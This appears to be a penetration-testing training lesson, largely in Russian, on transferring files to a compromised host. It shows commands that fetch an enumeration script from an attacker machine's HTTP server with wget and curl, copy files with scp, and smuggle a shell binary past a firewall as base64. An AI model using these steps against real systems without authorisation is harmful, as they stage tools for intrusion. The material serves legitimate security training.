# Transferring Files

Во время любого упражнения по тестированию на проникновение вполне вероятно, что нам потребуется передать файлы на удаленный сервер, такие как сценарии перечисления или эксплойты, или передать данные обратно на наш хост атаки. Хотя такие инструменты, как Metasploit с оболочкой Meterpreter, позволяют нам использовать `Upload` Чтобы загрузить файл, нам нужно изучить методы передачи файлов с помощью стандартной обратной оболочки.

---

## Using wget

Есть много способов добиться этого. Один из методов — запустить [HTTP-сервер Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) на нашей машине, а затем использовать `wget` или `cURL`для загрузки файла на удаленный хост. Сначала мы заходим в каталог, содержащий файл, который нам нужно передать, и запускаем в нем HTTP-сервер Python:

Передача файлов

```shell-session
Uliam@htb[/htb]$ cd /tmp
Uliam@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Теперь, когда мы настроили прослушивающий сервер на нашем компьютере, мы можем загрузить файл на удаленный хост, на котором выполняется код:

Передача файлов

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Обратите внимание, что мы использовали наш IP `10.10.14.1` и порт, на котором работает наш сервер Python `8000`. Если на удаленном сервере нет `wget`, мы можем использовать `cURL` чтобы скачать файл:

Передача файлов

```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Обратите внимание, что мы использовали `-o` флаг, чтобы указать имя выходного файла.

---

## Using SCP

Другой метод передачи файлов — использование `scp`, при условии, что мы получили учетные данные пользователя ssh на удаленном хосте. Мы можем сделать это следующим образом:

Передача файлов

```shell-session
Uliam@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Обратите внимание, что мы указали имя локального файла после `scp`, и удаленный каталог будет сохранен после `:`.

---

## Using Base64

В некоторых случаях мы не сможем передать файл. Например, удаленный хост может иметь защиту брандмауэра, которая не позволяет нам загрузить файл с нашего компьютера. В такой ситуации мы можем использовать простой трюк для [base64.](https://linux.die.net/man/1/base64) кодирования файла в `base64` формат, а затем мы можем вставить `base64`строку на удаленном сервере и декодируйте ее. Например, если мы хотим передать двоичный файл с именем `shell`, мы можем `base64` закодируйте его следующим образом:

Передача файлов

```shell-session
Uliam@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Теперь мы можем скопировать это `base64` строку, перейдите на удаленный хост и используйте `base64 -d` чтобы декодировать его и передать вывод в файл:

Передача файлов

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

## Validating File Transfers

Чтобы проверить формат файла, мы можем запустить [file :](https://linux.die.net/man/1/file) для него команду

Передача файлов

```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Как мы видим, когда мы запускаем `file` команда на `shell`файл, там написано, что это двоичный файл ELF, а это значит, что мы его успешно передали. Чтобы убедиться, что мы не испортили файл в процессе кодирования/декодирования, мы можем проверить его хеш md5. На нашей машине мы можем запустить `md5sum` в теме:

Передача файлов

```shell-session
Uliam@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Теперь мы можем перейти на удаленный сервер и выполнить ту же команду для переданного нами файла:

Передача файлов

```shell-session
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Как мы видим, оба файла имеют одинаковый хэш md5, то есть файл был передан корректно. Существуют и другие способы передачи файлов. Вы можете ознакомиться с [модулем «Передача файлов»](https://academy.hackthebox.com/module/details/24) для более подробного изучения передачи файлов.